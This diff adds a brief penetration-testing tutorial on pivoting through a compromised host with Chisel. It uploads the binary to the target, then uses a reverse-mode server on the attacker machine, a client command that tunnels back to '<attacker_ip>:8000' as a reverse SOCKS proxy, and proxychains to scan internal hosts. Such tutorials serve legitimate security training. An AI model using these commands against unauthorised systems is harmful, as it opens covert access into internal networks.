@@ -1,1 +1,44 @@
+🔹 Step 1: Download Chisel
+Get it from: https://github.com/jpillora/chisel/releases
 
+On attacker (Kali): download the Linux version.
+
+On target: download the matching architecture (e.g., chisel_1.8.1_windows_amd64.exe or linux_amd64).
+
+📁 Upload the binary to the target (use certutil, scp, or a web server).
+
+🔹 Step 2: Start Chisel Server (Attacker)
+Start the server in reverse mode to accept incoming client connections:
+
+bash
+Copy
+Edit
+chisel server -p 8000 --reverse
+-p 8000: Port to listen on
+
+--reverse: Accept reverse tunnels (client → server)
+
+🔹 Step 3: Start Chisel Client (Target)
+Start the client on the compromised host to create a reverse SOCKS proxy:
+
+bash
+Copy
+Edit
+chisel client <attacker_ip>:8000 R:socks
+R:socks: Create a reverse SOCKS5 proxy accessible from attacker
+
+Now you have a SOCKS5 proxy on attacker:1080 (default)
+
+🔹 Step 4: Use Proxychains (Attacker)
+Edit /etc/proxychains.conf or use proxychains4 with custom config:
+
+bash
+Copy
+Edit
+proxychains nmap -sT -Pn -p 445 10.10.10.123
+Or test it with:
+
+bash
+Copy
+Edit
+proxychains curl http://internalhost
